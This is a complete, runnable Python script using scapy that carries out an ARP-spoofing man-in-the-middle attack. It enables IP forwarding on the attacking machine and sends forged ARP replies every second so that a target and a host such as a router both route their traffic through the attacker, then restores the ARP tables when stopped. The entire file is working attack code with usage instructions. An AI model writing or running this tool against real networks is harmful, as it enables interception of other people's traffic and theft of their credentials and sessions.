#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import sys

# Enable IP forwarding to allow packet routing through the attacker's machine
def enable_ip_route():
    file_path = '/proc/sys/net/ipv4/ip_forward'
    with open(file_path, 'w+') as file:
        file.write('1')  # Enable IP forwarding

# Retrieve the MAC address of a device given its IP
def get_mac(ip):
    answered, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=2, verbose=0)
    if answered:
        return answered[0][1].hwsrc  # Return MAC address of the responder

# Spoof the ARP table of the target to believe host is at the attacker's MAC
def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)  # Send spoofed ARP response
    self_mac = ARP().hwsrc
    print(f"[+] Sent to {target_ip}: {host_ip} is-at {self_mac}")

# Restore the original ARP table by sending correct ARP responses
def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=5)  # Send multiple times to ensure restoration
    print(f"[+] Restored ARP table for {target_ip}")

# Main program execution
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 arp_spoofer.py <target_ip> <host_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]  # Target device IP
    host_ip = sys.argv[2]    # Host device IP (e.g., router)

    enable_ip_route()  # Enable IP forwarding

    try:
        while True:
            spoof(target_ip, host_ip)  # Spoof the target
            spoof(host_ip, target_ip)  # Spoof the host (e.g., router)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL + C, restoring the network...")
        restore(target_ip, host_ip)  # Restore target
        restore(host_ip, target_ip)  # Restore host
